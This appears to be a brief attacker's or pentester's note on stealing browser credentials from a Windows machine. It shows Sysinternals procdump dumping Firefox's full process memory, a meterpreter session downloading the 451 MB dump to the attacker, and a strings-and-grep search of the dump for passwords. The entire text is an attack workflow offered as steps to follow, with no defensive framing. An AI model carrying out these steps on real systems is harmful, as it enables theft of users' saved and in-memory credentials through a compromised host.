# procdump

## procdump (de sysinternals)

C:\Users\Chase\Documents>.\procdump.exe -accepteula -ma <pid> 
.\procdump.exe -accepteula -ma 6800

## meterpreter
meterpreter > download firefox_190921_223833.dmp
[*] Downloaded 451.12 MiB of 451.12 MiB (100.0%): firefox_190921_223833.dmp -> firefox_190921_223833.dmp
[*] download   : firefox_190921_223833.dmp -> firefox_190921_223833.dmp

$ strings firefox.exe_190921_173846.dmp |grep password

